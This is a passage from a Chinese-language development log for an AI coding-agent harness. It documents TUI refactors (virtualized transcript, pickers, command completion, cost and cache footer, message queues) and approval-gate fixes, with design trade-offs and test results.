  一行提示（`/export` 看全文）；`HISTORY_BATCH=200` 分批 `mount_all`。
- 只有最后 `HISTORY_MARKDOWN_TAIL=10` 条用 Markdown，其余 assistant 历史用
  `Static(Text)`；历史 tool 输出截断到 800 字符（完整内容仍在事件流/转录里）。
- 启动时的初始历史从「每条消息一个事件」改为一个 `history_messages` 事件，走同一
  批量渲染路径。
- `/resume` 完成后提示里带上「已折叠更早的 N 条」。

**设计对照**：Codex/Pi 的对话区是虚拟化列表，可以直接展示全量历史；Textual 的
`VerticalScroll` 不做虚拟化，所以这里用「限量 + 折叠提示」换取可交互的恢复速度，
语义上仍保留全量导出路径。

**取舍**：超过 400 条的历史不会自动出现在滚动区，需要 `/export` 或行式 REPL 查看；
这是为了恢复速度和内存占用做的显式折中。

**测试**：新增「500 条初始历史 → 控件数受限、末尾消息可见、折叠提示存在」；
总回归 1097 passed / 1 skipped，UI 测试 62 passed。
## TUI 头部与退出体验

**对照 Codex / Pi**：它们的顶部同时给出「在哪个会话、用的什么模型、工作目录」，
退出是即时的；我们的 TUI 头部只有模型与目录，且关闭窗口/`Ctrl+C` 可能停 10 秒。

**做法**：

- `ui_textual.run(..., title=...)` / `CCApp(title=...)`：头部显示
  `harness · <会话标题> · <模型> · <工作目录>`；`run_repl` 传入
  `session_store.session_summary()['title']`，恢复/新建会话后标题正确。
- `_run_agent` 退出等待从固定 10s 改为「最多 2s 且 `_exiting` 时直接跳过」：
  消费者已经停下时不再为 `unfinished_tasks` 空等。UI 测试套件从 42s 降到 12s，
  真实关窗也不会再假死。

**取舍**：标题超长截到 40 字符，避免挤掉模型与目录；完整标题仍可用 `/status` 查看。

**测试**：新增头部标题断言；UI 测试 63 passed，总回归 1097 passed / 1 skipped。
## 启动、成本、分页与候选面板

**对照 Codex / Pi 的四项遗留**：

1. **启动耗时**：交互模式把 MCP 初始化从「阻塞入口」改为后台线程
   （`start_mcp_initialization_async`）；`agent_loop` 在首轮请求前
   `wait_for_mcp_tools()`，界面先可用、首条消息前工具面齐全。失败也会置位
   `_mcp_ready`，不会让首条消息永久等待；退出前 `wait_for_mcp_tools(10)` 再关闭。
2. **成本显示**：新增 `src/pricing.py`（内置 CNY 价格表 + `LLM_PRICING_JSON` 覆盖）；
   `SessionMetrics` 按 prompt/completion/cached/reasoning 累计成本，
   `status`/`round_end` 带 `cost` / `cost_source` / `currency`；未知模型不猜价格，
   UI 继续隐藏成本而不是显示 0。
3. **历史分页**：`/more`（或 `older`）每次多加载 400 条，折叠提示里同时给出
   `/more to load older, /export for the full log`；`/clear` 重置分页状态。
4. **候选面板**：保留提示行内的下拉列表（Textual 无内建浮层），补上 `Esc` 优先
   关闭候选、再取消/回底的优先级；键盘路径仍是 Tab 采用、Alt+↑/↓ 选择。

**取舍**：

- MCP 异步初始化意味着“第一轮请求可能多等几百毫秒”，但 TUI/REPL 的出现时间不再被
  2.7s 的连接阻塞；headless/API 仍同步初始化，保证首轮工具面完整。
- 成本是估算值，UI 用 `~` 前缀；要“精确成本”需要供应商回传计费字段，当前没有。
- `/more` 重新挂载已加载部分（不保留滚动位置），换取实现简单与顺序正确；400 条
  重挂约 0.4-0.5s。
- 候选面板不是悬浮层：真正 overlay 需要焦点管理与分层渲染，收益有限，暂缓。

**测试**：新增 `tests/test_pricing.py`（默认价、缓存价、环境覆盖、未知模型）、
`test_ui_bridge` 成本字段、`test_ui.py` 的 `/more` 分页与 Esc 关闭候选、
`test_entrypoint` 的「MCP 未完成时 REPL 已启动」。总回归 1097 passed / 1 skipped，
UI 测试 66 passed。
## TUI 会话选择器

**问题**：`/sessions` 只是把会话列表当一段文字打印出来，恢复还得手打
`/resume 序号`。行式 REPL 早有方向键选择器，TUI 这边「上下键选择」没有迁移完整。

**做法**（对齐 Codex/Pi 的 resume picker）：

- 新增 `SessionPickerModal`：顶部搜索框（标题/工作区/ID 实时过滤）+ `OptionList`
  列表；`↑↓` 选择、`Enter` 恢复、`Esc` 取消；打开时首项高亮，聚焦列表后直接 Enter。
- 搜索框里按 `↓` 把焦点交给列表、`Enter` 选中第一条，减少一次 Tab/点击。
- `/sessions` 打开选择器；`/resume` 无参同样打开，有参仍按序号/ID/标题直接恢复；
  选择和直接恢复共用 `_resume_row`（打开事件流、恢复工作区、同步 session_id、重绘历史）。
- 删除原来的纯文本 `_list_sessions`，避免两套展示路径。

**取舍**：

- 选择器按标题/工作区/ID 做子串过滤，不做模糊评分；会话量大时先输入关键词足够。
- 恢复仍然重挂最近 400 条（`/more` 加载更早），与历史分页策略一致。

**测试**：`test_ui.py` 覆盖「选择器打开 → 搜索 `beta` → Enter 恢复正确会话」与
真实会话恢复（事件流 + session_id 切换）；总回归 1104 passed / 1 skipped，
UI 测试 61 passed。

## TUI 重构 P1/P0：拆包与虚拟化原型

**P1 拆包**：`ui_textual.py`（约 1600 行）迁到 `src/ui/app.py`，根目录保留同名薄壳
导出 `CCApp`/`run`/常量，`harness.run_repl` 与现有测试无需改动。UI 测试 75 条全绿。

**P0 虚拟化原型**：

- `src/ui/transcript/model.py`：`Block` + `ConversationModel`，流式只改一个块的
  payload/version，并用 `revision`/`take_dirty()` 暴露增量。
- `src/ui/transcript/layout.py`：`TranscriptLayout` 缓存每块 `(width, version)` 的行，
  增量更新、前缀行索引、`visible()` 切片、`block_at()` 命中测试。
- `scripts/bench_ui.py`（10k blocks）：布局 27ms、滚动切片 1.4ms/帧、
  流式增量 3.2ms（优化前 11.4ms，因每帧重建 entry 列表）。
- 浮层 spike：Textual 8.2 的 `position: absolute` + `overlay: screen` + `offset`
  可用，浮层不抢焦点，按 editor 坐标定位；下一步实现 CompletionPopup。

**测试**：新增 `tests/test_transcript_layout.py`（缓存复用、宽度变化、切片、
命中测试）；总回归 1109 passed / 1 skipped，UI 66 passed。
## TUI 重构 P2 起步：虚拟对话视口

- 新增 `VirtualTranscript(ScrollView)`：`virtual_size` 设为总行数，
  `render_line(y)` 用 `scroll_y + y` 从 `TranscriptLayout` 取单行；
  行缓存按 `(line, width, model.revision)` 失效，上限 4000 行。
- 滚动/翻页不触发布局重算（测试里 `render_calls` 保持不变），也不会为视口外
  的消息创建任何 widget。
- `follow_end`：布局刷新时若原本贴底则保持贴底；宽度变化触发重排。
- 测试：200 条消息的 demo App 挂载后 `virtual_size=200`、首行/滚动后首行正确、
  滚动不重算布局。

**测试**：总回归 1110 passed / 1 skipped；UI 64 passed（另 bridge/integration 11 条）。
## TUI 重构 P2：事件→块模型→虚拟视口打通

- 新增 `src/ui/harness_app.py`（`HARNESS_UI=textual-next` 试验入口）：
  `history_messages/user_message/assistant_*/tool_*/diff/error/status` 全部写入
  `ConversationModel`，刷新时只走 `VirtualTranscript`；不再按消息创建 Textual 控件。
- 工具块按 `call_id` 关联 start/end；点击视口命中 block 切换展开，`Ctrl+O` 可扩
  最后一个工具块（后续接键位）。
- 提交走 `submit_text` + worker 队列，`turn_control`/`permission_gate.use_ui` 与旧
  TUI 一致；`HARNESS_UI=textual` 仍运行旧实现，便于对照。
- 新入口带异常回退：Textual 启动失败时回退行式 REPL。

**测试**：新增 `tests/test_harness_app.py`（300 条历史、流式+工具事件、提交调用
agent）与 `test_textual_next_flag_runs_new_app`；总回归 1114 passed / 1 skipped，
UI 测试 66 passed。
## TUI 重构 P3：浮层补全、队列条与边框状态

- `src/ui/composer/completions.py`：`/` 命令与 `@` 文件候选、`apply_suggestion`
  纯函数，便于单测与复用。
- `CompletionPopup`：Textual 8.2 `position: absolute + overlay: screen + offset`，
  贴在 Composer 上方；焦点不离开编辑器。`Tab` 采用、`Alt+↑/↓` 选择、`Esc` 关闭。
- `PendingQueue`：worker 取队头、用户 `Alt+↑` 取回最后一条编辑；`#pending` 行显示
  `N queued` 与预览。
- editor 边框内嵌状态：`⠋ Working 12.3s · 2 queued`（Pi 的 embedWorkingStatus）。
- footer 基础指标：会话标题、模型、工作区(分支)、ctx%、tokens、估算成本、队列数。
- 程序化写回输入框（采用候选/取回队列）用 `_programmatic_text` 屏蔽 Changed，
  避免补全浮层“刚关闭又被重开”。

**测试**：`tests/test_harness_app.py` 新增 overlay/采用/Esc、队列条/取回、边框
Working；总回归 1117 passed / 1 skipped，旧 UI 66 passed。
## TUI 重构 P4：工具 renderer 与写入 diff

- 新增 `src/ui/renderers/tools.py`：工具块统一渲染 header（名称/摘要/耗时/状态）、
  diff（`+/-/@@` 着色，最多 80 行）、输出预览（默认 10 行，展开后全量）。
- harness 的 `exec_tool_call` 为写入类工具采集前后快照并生成 unified diff，
  放进 `tool_end.diff`：
  - `write`/`edit` 按 path，`apply_patch` 按补丁涉及的全部路径；
  - 跳过秘密文件（`is_secret_path`）、二进制/非 UTF-8、>1MB 文件；
  - diff 截断到 20k 字符，避免事件/模型上下文被撑大。
- 新 TUI 的 tool block 存 `diff` 并交给 renderer；旧 TUI 忽略该字段，行为不变。

**测试**：`tests/test_tool_renderer.py`（状态/耗时/diff/预览/展开）、
`tests/test_tool_diff_capture.py`（写文件产生 diff、秘密文件不产生 diff）；
总回归 1121 passed / 1 skipped，旧 UI 64 passed。
## TUI 重构 P5：共享模态与命令路由

- `PermissionModal`、`SessionPickerModal`/`SessionSearchInput` 从旧 `ui/app.py`
  抽到 `src/ui/modals/`，旧/新 TUI 共用同一份实现（CSS 由各自 App 提供）。
- 新 TUI（`textual-next`）补上 `/` 命令路由：help/status/model/pwd/clear/export/
  sessions/resume/allow/deny/ask/quit；其余命令明确提示「暂未迁移，用 --ui ansi」。
- `/sessions` 打开共享会话选择器，选择后按真实事件流恢复（工作区、session_id、
  历史重绘）；`/resume <n|前缀|标题>` 直接恢复。
- `permission_request` 事件打开审批弹窗，`y`/`n` 通过总线应答，agent 线程解除
  阻塞（与旧 TUI 一致）；新 TUI 也带 200ms 防误触。

**测试**：`tests/test_harness_app.py` 新增命令本地处理、选择器恢复真实会话、
审批弹窗应答；总回归 1124 passed / 1 skipped，旧 UI 66 passed。
## TUI 重构 P5b：命令注册表与 Pi 式模糊匹配

- `src/ui/fuzzy.py`：移植 Pi `fuzzy.ts`（MIT）的评分（连续命中/词边界加分、
  间隔扣分、`abc123`/`123abc` 互换），`fuzzy_filter` 支持多 token。
- `src/ui/commands.py`：`CommandSpec` 统一 name/description/argumentHint/aliases/
  ported；`find`/`matches`/`did_you_mean`/`help_text`/`hotkeys_text`。
  - 补全、`/help`、未知命令建议共用同一份元数据；
  - 未迁移命令标记 `ported=False`，帮助里单列「Only in line REPL」；
  - `/hotkeys` 与真实绑定同源，避免文档漂移。
- 新 TUI：命令分发改为注册表驱动（别名 `?`/`exit`/`transcripts` 生效），
  未知命令给模糊建议；补全只列 TUI 可用命令。
- 快捷键复查：`Ctrl+O` priority 展开工具、`Esc` 关候选→取消、`Ctrl+Q` 退出，
  避开 TextArea 的 `Ctrl+C` 复制与 `Ctrl+D` 删除。

**测试**：新增 `tests/test_ui_commands.py`（模糊评分/排序、别名、建议、帮助/快捷键）
与未知命令/`/hotkeys` 用例；总回归 1133 passed / 1 skipped，旧 UI 64 passed。
## TUI 重构 P5c：命令参数补全与帮助细化

**调研 Pi**：`BUILTIN_SLASH_COMMANDS` 只有元数据；真正的补全在
`pi-tui/autocomplete.ts` 的 `CombinedAutocompleteProvider`：
- 命令对象可带 `getArgumentCompletions(prefix)`，输入 `/cmd arg` 后由命令自己给出候选；
- 命令名补全后自动补一个空格，再进入参数补全；
- 动态来源（prompt 模板、扩展命令、`skill:name`）与内建命令合并，冲突时改名；
- 分发仍是 `interactive-mode` 里的前缀 if-chain，与我们的 switch 等价。

**复用/实现**：

- `CommandSpec.argument_completions`（对应 Pi 的 `getArgumentCompletions`）：
  - `/resume` → 会话 id/标题（`harness.session_rows`）；
  - `/model` → `MODEL_WINDOWS` + 当前模型；
  - `/allow|/deny|/ask` → `tool_registry` 工具名；
  - `/help` → TUI 可用命令名。
- Composer 补全区分「命令名」与「参数」：
  - `/he` 补 `/help `（带参数提示的命令自动补空格）；
  - `/resume 12` 只替换参数部分，不覆盖命令名；
  - 参数补全失败时静默返回空，不影响输入。
- `/help <命令>` 显示用法、描述与「仅行式 REPL」标记。

**未搬的 Pi 能力**（记录为后续）：动态命令（prompt 模板、扩展命令、`skill:name`）
与命令名冲突改名；命令面板的分类展示。

**测试**：`test_harness_app.py` 补参数替换、`/resume` 会话候选、`/help model`、
仅行式命令提示；总回归 1135 passed / 1 skipped，旧 UI 64 passed。
## TUI 重构 P5d：动态技能命令

**Pi 的实现**（`core/agent-session.ts::_expandSkillCommand`）：
- 命令名单来自资源加载器，命名 `skill:<name>`（补全同时匹配裸名）；
- 执行时读技能文件，剥掉 frontmatter，包成
  `<skill name="..." location="...">body</skill>`，有参数则附在块后；
- 未知技能原样透传；读取失败通过 extension runner 报错。

**我们的实现**：

- `commands.skill_commands()` 从 `skill_system.SKILL_REGISTRY` 动态生成
  `skill:<name>` 的 `CommandSpec`（描述来自 manifest），自动进入补全、`/help`
  与未知命令建议；工作区切换/技能编辑后随扫描更新。
- App 收到 `/skill:<name> [args]` 时展开成 `<skill name="name">body</skill>

args`
  作为一条 user 消息交给 agent（不占额外回合逻辑），未知技能提示错误。
- 与内建命令用前缀隔离，不会出现 Pi 里“扩展命令与内建命令重名”的冲突；
  暂未实现 prompt 模板/扩展命令两个动态来源。

**测试**：`test_harness_app.py` 技能展开（含参数）与未知技能；`test_ui_commands.py`
动态注册/匹配；总回归 1138 passed / 1 skipped，旧 UI 64 passed。
## TUI 重构 P5e：常用命令迁移

- `/diff`、`/cache`、`/sandbox`：直接复用行式实现，输出写入对话块；sandbox 切换后
  更新状态。
- `/review`：后台线程执行，进度与最终结果写进同一块（`review.run_review(progress=)`），
  不占对话回合；忙碌时提示先结束当前请求。
- `/model`：新增 `ModelPickerModal`（OptionList），选择后写回 `LLM_MODEL_ID` 并刷新
  footer；带参 `/model <name>` 直接切换。
- `/expand` 切换最近工具块；`/approvals` 复用 `format_pending_approvals`。
- 参数补全新增 `sandbox`（三档 + approvals）与 `cache`（gc/天数/--apply）。
- 仍未迁移：checkpoints/rewind/undo/fork/archive/delete/watch/revoke/workspaces/
  workspace/cd/new/compact/find/rename/more，命令注册表里继续标 `ported=False`，
  帮助中单列并提示 `--ui ansi`。

**测试**：新增 diff/sandbox、cache 委派、model picker、review 后台进度块用例；
总回归 1142 passed / 1 skipped，旧 UI 64 passed。
## 会话命令调研：Pi 的命名与模型

先读 Pi `interactive-mode.ts` 的会话相关 handler，结论是**同名不同义**要分开看：

| Pi | 语义 | 我们的对应 | 处理 |
|---|---|---|---|
| `/new` | `runtimeHost.newSession()`（可含工作区/信任选择） | `/new` 新建事件会话 | 迁移，当前工作区；参数=会话 ID |
| `/resume` | 会话选择器 | `/sessions`（无参 `/resume`） | 已有 |
| `/fork` | 选择某条 **user 消息** 处分叉 | `/fork [seq]` 按事件序号 | 迁移，补 `/clone` 别名（当前叶） |
| `/tree` | 消息树任意节点切换 + 分支摘要 | 无 | 不硬套；checkpoint/rewind 不是树 |
| `/clone` | 从当前叶复制会话 | `/fork` 无参 | 别名 |
| `/name` | 重命名会话 | `/rename` | 别名 |
| `/session` | 会话信息/统计 | `/status` | 别名 |
| `/compact [instructions]` | 压缩上下文，可带自定义指示 | `/compact` | 迁移；暂忽略自定义指示 |
| `/checkpoints` `/rewind` `/undo` | 无（Pi 靠 tree/fork） | 文件快照 + 事件回退 | 保留我们的语义，`/checkpoints` 先迁移 |

实现要点：

- `harness.run_repl` 把 `session_store` 传给新 App，旧 App 增加同名参数忽略；
- 新 App 的 `/new` `/fork` 通过 `_adopt_session` 统一换 store、重建消息和视图；
- `/fork` 复用 `SessionEventStore.fork`，原会话保留；`/rename` 写 `session_title`
  事件并刷新 footer；`/compact` 后台线程压缩 + `_record_compaction`，结果写进度块；
- `/checkpoints` 复用 `get_checkpoint_manager` / `format_checkpoint_list`。

**暂缓**：`/tree`、`/rewind`、`/undo`（需要消息树/确认弹窗）、`/archive` `/delete`
（Pi 在 CLI，不在 TUI）、`/find` `/workspaces` `/cd`。

**测试**：rename/fork/new 换会话、checkpoints、compact 后台块；总回归 1144 passed /
1 skipped，旧 UI 64 passed。
## TUI 重构 P5g：/fork 消息选择器

按 Pi `UserMessageSelectorComponent` 的交互补齐：

- 数据：只取 `type=message` 且 `role=user` 的事件，过滤空文本和压缩 marker；
- 展示：`Fork from message` + 单行截断 + `i/N`，最多 16 行，默认高亮最新一条；
- 键位：↑↓、Enter、Esc；Esc 不改变当前会话；
- 语义：选中 seq `s` 后 `fork(upto_seq=s-1)`，即 **before**，新会话不包含选中的
  那条 user 消息；原文回填 composer（不改 `_programmatic_text` 会被当作用户输入
  自动补全，所以设置后直接聚焦）；
- `/clone` 独立成命令，等价 Pi 的 `position:"at"`（复制到当前叶）；
- `/fork <seq>` 仍保留，语义是 inclusive 前缀复制，供脚本/高级用法。

**与 Pi 的差异**：Pi fork 后整条消息文本进入编辑器并等待用户改完再发；我们同样
回填但不自动发送。Pi 的 `/tree` 仍然没有实现（事件流没有树结构）。

**测试**：默认选最新、before 语义（选中消息不在新会话、前文保留）、Esc 取消、
`/clone` 保留完整历史；总回归 1146 passed / 1 skipped，旧 UI 64 passed。
## TUI 交互自检：Ctrl-C、选择器与鼠标

用户反馈「键鼠对选择器无法操控、Ctrl-C 不能退出」，逐项复现后定位到四类问题：

1. **Ctrl-C 被覆盖**：`HarnessApp` 继承 `App` 时重写了 `BINDINGS`，只留 `ctrl+q`；
   Textual `App` 默认绑定里的 `ctrl+c` 被整体替换掉，所以按 Ctrl-C 没有任何 action。
   修复：显式加回 `ctrl+c -> quit_app`（`priority=True`），模态打开时同样生效。
2. **补全浮层只能 Alt+↑/↓**：普通 ↑/↓ 落到 TextArea 光标移动，用户看起来像“选不中”；
   且 `CompletionPopup` 是 `Static`，没有 `on_click`，鼠标点击无效。
   修复：Composer 增加普通 ↑/↓（有候选时切换、否则移动光标），保留 Alt+↑ 取回队列；
   `CompletionPopup.on_click` 按行号调用 `choose_suggestion`。
3. **会话选择器焦点在搜索框**：原实现只绑定了 ↓ 才进列表，↑ 是 Input 光标移动；
   Enter 只把焦点移到列表，还要再按一次。修复：↑/↓ 都进列表；Enter 直接选中当前
   highlight 并触发 `OptionList.action_select`。
4. **模态抢焦点时机**：`on_mount` 里立即 `focus()` 在部分终端可能被后续 screen
   activate 覆盖。改为 `call_after_refresh(focus)`，等 screen 真正激活后再聚焦。

鼠标方面，`OptionList` 本身支持点击；测试覆盖 fork 列表点击第一行、补全浮层点击第二行、
会话选择器点击行。Esc、↑↓、Enter 在 fork/model/session 三个选择器上都有用例。

**测试**：新增 Ctrl-C（主界面+模态）、选择器键盘/鼠标、补全 ↑↓/鼠标、会话搜索 Enter
用例；总回归 1149 passed / 1 skipped，旧 UI 64 passed。
## 补全候选 Enter 无效：选中态与确认语义

用户反馈“上下键后 Enter 没效果”。复现后确认两件事：

- 选中行其实已经变化（`_suggestion_index` 在变），但浮层只有 `▸` 标记，视觉不明显；
- Enter 仍走 `Composer.action_submit -> submit_text`，把**原始半截文本**发了出去，
  候选选中结果完全没被采用，所以看起来“Enter 没反应”。

按 Pi `editor.ts` 的 autocomplete 分支对齐：

1. 有候选时 Enter 先 `applyCompletion`；
2. 若补全的是 slash command（`autocompletePrefix.startsWith("/")`），采用后
   **继续提交**，直接执行命令；
3. 路径/`@` 文件补全只回填，不提交，留给用户继续编辑；
4. 浮层选中行加粗，保留 `▸`，Tab 仍然只采用不执行。

实现落在 `HarnessApp.submit_composer()`：Composer 的 Enter 全部委托给它；
`CompletionPopup.show()` 把选中行渲染成粗体。测试覆盖 `/he` + Enter 执行 `/help`、
`@src/ap` + Enter 只回填不发消息。

**测试**：1151 passed / 1 skipped，旧 UI 64 passed。
## TUI 响应体验：首屏、最后一答、工具预览

三个问题分别处理：

1. **提交后迟迟不显示**
   - `_send_user()` 追加用户块后立即 `_flush_layout()`，不再等 50ms 定时器；
   - `agent_loop` 仍会 `print()` 最终回答、tokens、diff 等；Textual 已接管屏幕，
     这些写 terminal 的操作会和 UI 重绘抢输出。worker 内用
     `redirect_stdout(StringIO())` 收走，UI 只走事件总线；
   - 回合开始立即刷新 composer 的 `Working Ns` 状态。

2. **最后没有回答**
   - `_run_agent` 保存 `agent_loop()` 返回值（最终 `message.content`）；
   - `_sync_final_answer()` 在回合结束兜底：先 `_drain_events()` 吃掉排队的
     delta/end，再比较最后一个 assistant 块；缺失或仍 streaming 就补全，
     已有完整块则不动，避免重复；
   - 事件流正常时仍以事件为准，兜底只处理丢失/异常路径。

3. **工具 more lines 不可点**
   - 工具块预览从固定 10 行改为两级：10 行 ↔ 40 行，提示行显示
     `… N more lines · 点击 show more/show less` 并高亮；
   - 点击工具块任意行调用 `toggle_tool_preview()`；`Ctrl+O` / `/expand` 仍切换全文；
   - 已用 `Ctrl+O` 展开全文时，点击会回到 10 行折叠。

**测试**：工具 50 行点击 10↔40、最终回答兜底（无事件）、兜底不与正常
流式重复；总回归 1154 passed / 1 skipped，旧 UI 64 passed。
## 对话无输出与状态栏缺失：session_store 断链

用户反馈“输入后只有 Working/用时，没有回答；上一轮结果要 resume 才出现”。定位到
worker 调 `harness.agent_loop(self._messages)` 时**没有传 `session_store`**：

- `agent_loop` 每次都会新建一个 SessionEventStore（不同 session id）；
- 事件桥给事件打上新 session id，App 只渲染当前会话，于是本轮 user/assistant/tool
  事件全被过滤；
- 会话文件确实写了新内容，所以 resume 时能重建出来，看起来像“下一轮才刷新”。

修复：

- `_run_agent` 把 App 当前的 `self._store` 作为 `session_store=` 传入；没有 store
  （测试/独立用法）才退回旧行为；
- worker 捕获非 KeyboardInterrupt 异常，转成可见的 `Error:` 回答，不再无声退出；
- footer 增加 `ctx N% 50.0k/200.0k`、`cache N%`（cached/prompt，clamp 100%），
  并处理 `round_end` 的 prompt/cached/total/cost；状态栏先放指标再放较长的
  workspace，窄终端不会被挤掉；
- `/status` 同步显示 cache 命中率。

**测试**：worker 传入的 store 与 App 一致、事件能落块；footer 的 ctx/cache 文案；
总回归 1156 passed / 1 skipped，旧 UI 64 passed。
## Pi 调研：token 计数、成本与缓存命中率

阅读 Pi `components/footer.ts`、`usage-totals.ts`、`cache-stats.ts` 和 bundle 里的
`calculateCost`：

- **usage 分桶**：`input`、`output`、`cacheRead`、`cacheWrite`、`totalTokens`；
  `cost` 也按四桶拆开。`totalTokens` 是四者之和。
- **成本**：`cost.input = input_rate/1e6*input`，output/cacheRead/cacheWrite 同理；
  `cacheWrite1h` 用 input 的 2 倍；模型可配置按输入规模的 `cost.tiers`。
  `reasoning` 是 `output` 的子集，不单独加价，否则会重复计费。
- **缓存命中率**：取**最近一条 assistant message** 的
  `cacheRead / (input + cacheRead + cacheWrite)`；没有缓存活动不显示。
- **footer**：左边是 `cwd (branch) • session name`，右边是累计
  `↑input ↓output RcacheRead WcacheWrite CHxx.x%`、成本和
  `contextPercent/contextWindow`；上下文超过 70%/90% 用警示色。
- **缓存浪费**：跨回合比较 `cacheRead`，miss 低于 1024 tokens 视为噪声；这是诊断，
  不是基础计数。

我们的实现：

- `_parse_usage` 增加 `cache_write`；`SessionMetrics` 记录累计 fresh input/output/
  cacheRead/cacheWrite 和最近一次 prompt/cached/rate；
- `pricing.estimate_cost` 改为分桶公式，reasoning 只覆盖 output 单价；
- footer 常驻 cwd(branch)，显示 `ctx`、`↑/↓/R/W`、`cache%` 和成本；
  “新会话/新对话”占位标题不再占据第一段，footer 每秒刷新目录/分支。
- 未知缓存价回退 input 价，未知模型仍不猜成本。

**测试**：pricing 的 reasoning 不重复计费、reasoning 溢价、cache_write 单价；
footer ctx/cache 文案；总回归 1158 passed / 1 skipped，旧 UI 64 passed。
## TUI 渲染：Markdown 流式、颜色与重排延迟

- **先看到 md 源码**：`_render_block` 之前对 `streaming=True` 的 assistant 用纯
  `Text(text)`，所以 `**bold**`、代码围栏会原样出现，回合结束才换成 Markdown。
  现在流式/完成统一走 `RichMarkdown`；Rich 能解析未闭合围栏，最后一块复用同一路径。
- **流式 Markdown 很贵**：10k 文本一次 Markdown 渲染约 50ms，20fps 会卡 UI。
  `_flush_layout(force=False)` 在回合中检测 streaming assistant，限制为至少 120ms
  重排一次；用户消息、最终回答、工具展开仍 `force=True` 立即刷新。
- **颜色**：Rich 默认 `markdown.code` 是 `cyan on black`，在 Textual dark 背景上
  突兀；新增 `MARKDOWN_THEME`，统一正文/标题/代码/链接/列表颜色，代码块用深灰底。
  工具输出里残留的 ANSI 色码在 Textual 中会串色/显示乱码，展示前 `_strip_ansi`。
- **footer 占位标题**：`新会话/新对话/New session/Untitled` 不再显示；第一段固定为
  `目录 (分支)`，每秒刷新；token 指标与上一轮的 Pi 口径保持一致。

**测试**：流式内容不含 `**`/反引号、Markdown 代码无 black 背景、footer 不含占位
标题且以 cwd 开头、工具 ANSI 剥离；总回归 1163 passed / 1 skipped，旧 UI 64 passed。
## 审批全屏、复制与 Markdown 健壮性

- **审批弹窗全屏**：`Screen { background: $background; }` 同样命中了 ModalScreen，
  遮罩不透明且盒子默认左上角，看起来像“聊天记录没了”。现在
  `ModalScreen { background: $background 60%; align: center middle; }`，
  `#perm-box` 限制 `max-height: 80%`，对话在遮罩下仍可见。
- **复制**：`Transcript` 支持 Textual 选择。Ctrl-C 有选中文本时复制、否则退出；
  `Ctrl+Shift+C` 显式复制；`/copy` 复制最近一次工具输出的完整内容（不受展开
  预览限制）。选择时点击不会顺带展开工具。
- **畸形 Markdown**：Rich Markdown 对 `[x](`、未闭合代码围栏等多数畸形输入是
  容错的；仍加 `_render_markdown` try/fallback，异常时退回纯文本，避免整帧崩溃。
- **Profile**（本机）：
  - `scripts/bench_ui.py 10000 100 100`：layout 30.1ms，scroll 0.95ms/frame，
    streaming block update 1.8ms；
  - 10k Markdown 文本渲染约 63ms，其中 `markdown_it.parse` ~28ms、
    `rich.console.render_lines` ~34ms；流式已限制 120ms 重排一次，避免每 token
    重排。
  - 可继续优化：稳定前缀增量 Markdown、最终态复用流式渲染结果、把 Console
    缓存已做；若输出超大，可降级为轻量纯文本渲染。

**测试**：审批盒子尺寸、Ctrl-C 选中复制、/copy、畸形 Markdown fallback；总回归
1167 passed / 1 skipped，旧 UI 64 passed。
## 队列：steer / follow-up / dequeue / cancel

之前所有“回合中输入”都进入 `_pending` 顺序队列，Alt+Up 只看 `_pending` 且只取最后
一条，所以和 Pi 的语义不一致；用户在流式期间发的消息也不会进入当前上下文。

现在：

- **Enter（运行中）→ steer**：进入 `_steering`，`agent_loop(steer_provider=...)`
  在每轮请求前和最终回答前 drain，追加为 user message 到同一个上下文；
- **Alt+Enter → follow-up**：进入 `_pending`，等本次 `agent_loop` 结束再处理；
- **Alt+↑ / F2 / `/dequeue`**：把 steering + follow-up 全部取回编辑器（不再只取
  最后一条），队列条分别标 `steer:` / `next:`；
- **Esc 取消**：设置 cancel 后调用 `dequeue_all()`，未消费的消息回到输入框，
  不会在取消后自动继续执行；
- steer 先只进队列，agent loop 注入时发 user_message 事件落块；取消/刖除不会留下幽影消息；
- `active` 计数、footer 和 composer 的 `N queued` 都合并两个队列。

限制：steer 不能中断已经在传输中的 HTTP 流，只能在下一轮请求/工具批次前注入；
这是 Pi 同类的边界。若终端不识别 Alt+Up，可用 F2 或 `/dequeue`。

**测试**：steer/follow-up 分队列、Alt+Up 全部取回、Esc 取消回填、agent_loop 注入；
总回归 1170 passed / 1 skipped，旧 UI 64 passed。

## 审批：TUI 卡片补上「本会话允许同类」

- **现象**：同一类外部/MCP 工具调用在 CLI 里批一次后不再问，切到 Textual 后每次都弹；
  用户直观感受是「审批变多了，是不是沙箱没了」。
- **根因**：`PermissionModal` 只有 `y`/`n`，`ui_events.PermissionGate.request()` 只回
  `bool`，`scope='session'` 从未到达 `hooks.GATE.resolve`。CLI 的 `a` 走的是另一条路径，
  所以只有 TUI 丢失了预授权。
- **修复**：`request_scoped()` 返回 `(allowed, scope)`，并按登记时的 `allow_session`
  过滤伪造的 session scope；卡片新增 `a`，`hooks` 把它传给 `resolve`。没有同类键的命令
  （解释器、外发请求等）不显示 `a`，服务端也会丢弃这类请求伪造的 scope。
- **测试**：卡片 `y`/`n`/`a`、无同类键按 `a` 无效、`request_scoped` 的 scope 过滤；
  全量回归 1175 passed / 1 skipped，旧 UI + 新 UI 定向 127 passed。

## 结构拆分：策略文本分析 / 文档格式 / 审批

三个千行级模块按职责拆开，行为不变，导入点保持兼容：

- `exec_policy.py` → `policy_bash.py`（bash 文本分析：包装器、只读判定、外发目标、
  `approval_class` / `grant_key` / `session_allow_key`）。命令文本判定不依赖路径分区，
  独立后 `exec_policy` 只保留决策矩阵与路径分类，并 re-export 公开名字。
- `documents.py` → `document_formats.py`（DOCX/PPTX/XLSX 解析与共享 zip/XML 工具）；
  入口只留格式识别、PDF 解析与分发。解析器读的上限常量在 `document_formats`，
  测试补丁点随之调整（`documents.MAX_ZIP_MEMBER_BYTES` 只是兼容 re-export）。
- `hooks.py` → `approval.py`（`PermissionGate`、超时、UI 分流）与 `approval_judge.py`
  （LLM 审查官）。审批门不 import `hooks`：会话 id 与凭据清理由 hooks 构造 `GATE` 时
  以回调注入；审查官运行期通过 hooks 的公共入口取 `GATE` / `evaluate_call` /
  `current_session_id`，避免复制状态造成两条路径漂移。`hooks` 继续持有会话 ContextVar、
  凭据、策略判定与 hook 注册，并 re-export 公开名字。

模块导入、普通构造器仍不启动线程/网络；`_h()` 与审查官对 hooks 的引用保持懒加载，
既避开循环导入，也不破坏测试对 `hooks.*` 的 monkeypatch。

**测试**：拆分前后对移动的定义做 AST 源片段比对（仅预期改动：`PermissionGate`
构造注入、审查官懒加载、`GATE` 组装）；全量 1175 passed / 1 skipped，
